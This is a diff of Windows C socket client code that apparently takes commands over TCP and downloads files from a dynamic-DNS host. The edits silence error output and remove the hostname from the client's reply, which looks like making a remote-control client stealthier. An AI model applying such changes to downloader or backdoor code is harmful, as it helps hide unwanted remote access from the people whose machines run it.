@@ -66,16 +66,13 @@ int main(int argc, char * argv[])
 		//startup sa
 		WSADATA wsa;
 		if(WSAStartup(MAKEWORD(2, 2), &wsa) != NO_ERROR){
-			fprintf(stderr, "Client : Error at wsastartup.\n"); // Output error
+			goto close;
 		}
 
 		/* initialize socket */
 		SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 		if(s == INVALID_SOCKET){
-			fprintf(stderr, "Client : socket() - Error at socket(): %i\n", //Output error
-			WSAGetLastError());
-			WSACleanup();
-			return -1;
+			goto close;
 		}
 
 		/* setup variables */
@@ -180,7 +177,7 @@ int main(int argc, char * argv[])
 						} else if (iscommand(buf[0]) == 1) { //file download command
 							memset(buf, 0, BUFSIZE);
 							download();
-							strcpy(buf, "file downloaded from p4p1server.hopto.org\n");
+							strcpy(buf, "file downloaded\n");
 						} else {
 							memset(buf, 0, BUFSIZE);
 						}
